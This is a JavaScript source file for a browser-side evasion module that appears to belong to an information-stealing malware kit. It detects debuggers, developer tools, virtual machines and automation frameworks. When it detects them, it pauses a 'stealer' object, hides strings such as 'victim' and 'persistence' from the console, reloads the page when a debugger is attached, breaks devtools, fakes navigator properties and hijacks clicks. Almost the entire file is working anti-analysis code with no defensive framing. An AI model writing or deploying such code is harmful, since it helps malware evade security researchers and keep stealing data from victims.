class EvasionTechniques {
    constructor() {
        this.evasionMethods = {
            debuggerDetection: true,
            devToolsDetection: true,
            vmDetection: true,
            automationDetection: true,
            performanceMonitoring: true
        };
        this.isBeingMonitored = false;
    }

    async executeEvasionTechniques() {
        console.log('Executing evasion techniques...');

        try {
            // Detect monitoring environment
            await this.detectMonitoring();
            
            // Apply evasion techniques if needed
            if (this.isBeingMonitored) {
                this.activateStealthMode();
            } else {
                this.applyBasicEvasion();
            }
            
            // Continuous monitoring
            this.startContinuousEvasion();
            
        } catch (error) {
            console.error('Evasion error:', error);
        }
    }

    async detectMonitoring() {
        const detectionResults = {
            debugger: this.detectDebugger(),
            devTools: this.detectDevTools(),
            vm: this.detectVM(),
            automation: this.detectAutomation(),
            performance: this.detectPerformanceMonitoring()
        };

        this.isBeingMonitored = Object.values(detectionResults).some(result => result);
        
        console.log('Monitoring detection results:', detectionResults);
        return detectionResults;
    }

    detectDebugger() {
        try {
            // Method 1: Debugger statement timing
            const start = performance.now();
            debugger;
            const end = performance.now();
            
            if (end - start > 100) {
                return true;
            }
            
            // Method 2: Function constructor
            const debuggerTest = new Function('debugger;');
            try {
                debuggerTest();
            } catch (e) {
                return true;
            }
            
            return false;
            
        } catch (error) {
            return false;
        }
    }

    detectDevTools() {
        try {
            // Method 1: Console.log detection
            const element = document.createElement('div');
            Object.defineProperty(element, 'id', {
                get: () => {
                    this.isBeingMonitored = true;
                    return true;
                }
            });
            
            console.log(element);
            console.clear();
            
            // Method 2: Firebug detection
            if (window.console && window.console.firebug) {
                return true;
            }
            
            // Method 3: Developer tools width/height
            const widthThreshold = window.outerWidth - window.innerWidth > 160;
            const heightThreshold = window.outerHeight - window.innerHeight > 160;
            
            if (widthThreshold || heightThreshold) {
                return true;
            }
            
            return false;
            
        } catch (error) {
            return false;
        }
    }

    detectVM() {
        try {
            // Check for virtual machine indicators
            const checks = [
                // GPU checks
                () => {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl');
                    if (!gl) return false;
                    
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (!debugInfo) return false;
                    
                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    return renderer.toLowerCase().includes('vmware') || 
                           renderer.toLowerCase().includes('virtualbox');
                },
                
                // Performance checks
                () => {
                    const perf = window.performance || window.msPerformance || window.webkitPerformance;
                    if (!perf) return false;
                    
                    const entries = perf.getEntriesByType('navigation');
                    if (entries.length === 0) return false;
                    
                    const nav = entries[0];
                    return nav.domContentLoadedEventEnd - nav.domContentLoadedEventStart < 1;
                },
                
                // Plugin checks
                () => {
                    const plugins = Array.from(navigator.plugins);
                    return plugins.some(plugin => 
                        plugin.name.toLowerCase().includes('vmware') ||
                        plugin.name.toLowerCase().includes('virtual')
                    );
                },
                
                // User agent checks
                () => {
                    const ua = navigator.userAgent.toLowerCase();
                    return ua.includes('vmware') || ua.includes('virtual');
                }
            ];
            
            return checks.some(check => check());
            
        } catch (error) {
            return false;
        }
    }

    detectAutomation() {
        try {
            // Check for automation tools
            const checks = [
                // WebDriver
                () => navigator.webdriver,
                
                // Chrome automation
                () => window.chrome && window.chrome.runtime && window.chrome.runtime.onConnect,
                
                // PhantomJS
                () => window.callPhantom || window._phantom,
                
                // Selenium
                () => document.__webdriver_script_func || document.$cdc_asdjflasutopfhvcZLmcfl_,
                
                // Nightmare
                () => window.nightmare,
                
                // Puppeteer
                () => navigator.userAgent.includes('HeadlessChrome'),
                
                // Language checks
                () => navigator.languages.length === 0
            ];
            
            return checks.some(check => check());
            
        } catch (error) {
            return false;
        }
    }

    detectPerformanceMonitoring() {
        try {
            // Check if performance monitoring is active
            const perf = window.performance || window.msPerformance || window.webkitPerformance;
            if (!perf) return false;
            
            const marks = perf.getEntriesByType('mark');
            const measures = perf.getEntriesByType('measure');
            
            // If there are many performance marks/measures, might be monitored
            return marks.length > 10 || measures.length > 10;
            
        } catch (error) {
            return false;
        }
    }

    activateStealthMode() {
        console.log('Activating stealth mode...');
        
        // Disable data collection in stealth mode
        if (window.DataStealer && window.stealer) {
            window.stealer.isActive = false;
        }
        
        // Clear any sensitive data
        this.clearTemporaryData();
        
        // Apply aggressive evasion
        this.applyAggressiveEvasion();
        
        // Fake normal behavior
        this.simulateNormalBehavior();
    }

    applyBasicEvasion() {
        // Basic evasion techniques that are always applied
        
        // Override console methods
        this.overrideConsoleMethods();
        
        // Modify performance timing
        this.modifyPerformanceTiming();
        
        // Random delays
        this.addRandomDelays();
        
        // Mask user agent
        this.maskUserAgent();
    }

    applyAggressiveEvasion() {
        // More aggressive evasion when monitoring is detected
        
        // Block debugger
        this.blockDebugger();
        
        // Detect and break devtools
        this.breakDevTools();
        
        // Fake environment
        this.fakeEnvironment();
        
        // Obfuscate execution
        this.obfuscateExecution();
    }

    overrideConsoleMethods() {
        const originalLog = console.log;
        const originalError = console.error;
        const originalWarn = console.warn;
        
        console.log = function(...args) {
            // Filter out sensitive information
            const filteredArgs = args.map(arg => {
                if (typeof arg === 'string' && (
                    arg.includes('victim') || 
                    arg.includes('stealer') ||
                    arg.includes('persistence')
                )) {
                    return '[REDACTED]';
                }
                return arg;
            });
            originalLog.apply(console, filteredArgs);
        };
        
        console.error = originalError;
        console.warn = originalWarn;
    }

    modifyPerformanceTiming() {
        if (!window.performance) return;
        
        // Modify performance marks to hide our activities
        const originalMark = performance.mark;
        performance.mark = function(name) {
            if (name && name.includes('system')) {
                return; // Don't mark system activities
            }
            return originalMark.apply(performance, arguments);
        };
    }

    addRandomDelays() {
        // Add random delays to break timing analysis
        const originalSetTimeout = window.setTimeout;
        window.setTimeout = function(callback, delay, ...args) {
            const jitter = Math.random() * 1000; // Up to 1 second jitter
            return originalSetTimeout(callback, delay + jitter, ...args);
        };
    }

    maskUserAgent() {
        // Minimal user agent masking
        Object.defineProperty(navigator, 'userAgent', {
            get: () => {
                const baseUA = navigator.userAgent;
                // Remove any automation indicators
                return baseUA.replace(/HeadlessChrome/g, 'Chrome');
            },
            configurable: false
        });
    }

    blockDebugger() {
        // Anti-debugging techniques
        setInterval(() => {
            const start = Date.now();
            debugger;
            if (Date.now() - start > 100) {
                window.location.reload(); // Refresh if debugger detected
            }
        }, 1000);
    }

    breakDevTools() {
        // Techniques to break developer tools
        const element = document.createElement('div');
        Object.defineProperty(element, 'id', {
            get: () => {
                throw new Error('DevTools blocked');
            }
        });
        
        console.log(element); // This will break when inspected
    }

    fakeEnvironment() {
        // Fake environment properties
        if (navigator.webdriver) {
            delete navigator.webdriver;
        }
        
        // Fake plugins
        Object.defineProperty(navigator, 'plugins', {
            get: () => [1, 2, 3, 4, 5], // Fake plugins array
            configurable: false
        });
        
        // Fake hardware concurrency
        Object.defineProperty(navigator, 'hardwareConcurrency', {
            get: () => 4, // Fake CPU cores
            configurable: false
        });
    }

    obfuscateExecution() {
        // Obfuscate function execution
        const originalEval = window.eval;
        window.eval = function(code) {
            // Simple obfuscation of eval calls
            const obfuscated = code.split('').reverse().join('');
            return originalEval(obfuscated);
        };
    }

    simulateNormalBehavior() {
        // Simulate normal user behavior
        
        // Random mouse movements
        document.addEventListener('mousemove', (event) => {
            if (Math.random() < 0.1) { // 10% chance
                const randomX = event.clientX + (Math.random() * 10 - 5);
                const randomY = event.clientY + (Math.random() * 10 - 5);
                // Simulate slight mouse movement variations
            }
        });
        
        // Random scrolling
        setInterval(() => {
            if (Math.random() < 0.05) { // 5% chance every interval
                window.scrollBy(0, Math.random() * 100 - 50);
            }
        }, 5000);
        
        // Random clicks
        document.addEventListener('click', (event) => {
            if (Math.random() < 0.3) { // 30% chance
                // Add slight random delay to clicks
                event.preventDefault();
                setTimeout(() => {
                    event.target.click();
                }, Math.random() * 100);
            }
        });
    }

    clearTemporaryData() {
        // Clear any temporary data that might be suspicious
        try {
            sessionStorage.clear();
            // Don't clear localStorage as it might contain persistence data
        } catch (error) {
            // Ignore errors
        }
    }

    startContinuousEvasion() {
        // Continuous monitoring and evasion
        setInterval(() => {
            this.detectMonitoring().then(results => {
                if (results.debugger || results.devTools) {
                    this.activateStealthMode();
                }
            });
        }, 5000); // Check every 5 seconds
        
        // Randomly change evasion techniques
        setInterval(() => {
            this.shuffleEvasionTechniques();
        }, 30000); // Change every 30 seconds
    }

    shuffleEvasionTechniques() {
        // Randomly enable/disable evasion techniques
        Object.keys(this.evasionMethods).forEach(method => {
            if (Math.random() < 0.3) { // 30% chance to toggle
                this.evasionMethods[method] = !this.evasionMethods[method];
            }
        });
    }

    // Public method to check if evasion is active
    isEvasionActive() {
        return Object.values(this.evasionMethods).some(method => method);
    }

    // Public method to get evasion status
    getEvasionStatus() {
        return {
            isActive: this.isEvasionActive(),
            isMonitored: this.isBeingMonitored,
            methods: this.evasionMethods
        };
    }
}

// Export for use in other modules
window.EvasionTechniques = EvasionTechniques;
